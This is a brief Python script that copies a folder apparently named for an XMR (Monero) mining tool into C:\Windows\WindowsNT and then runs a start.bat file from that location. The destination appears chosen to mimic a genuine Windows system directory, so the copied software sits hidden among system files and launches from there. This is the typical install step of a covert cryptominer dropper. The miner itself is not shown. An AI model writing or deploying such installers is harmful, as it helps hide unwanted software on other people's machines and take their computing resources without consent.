from shutil import copytree
from subprocess import call


if __name__ == '__main__':
    copytree('.\\xmrookie', 'C:\\Windows\\WindowsNT')
    call('C:\\Windows\\WindowsNT\\start.bat')
    call('pause')
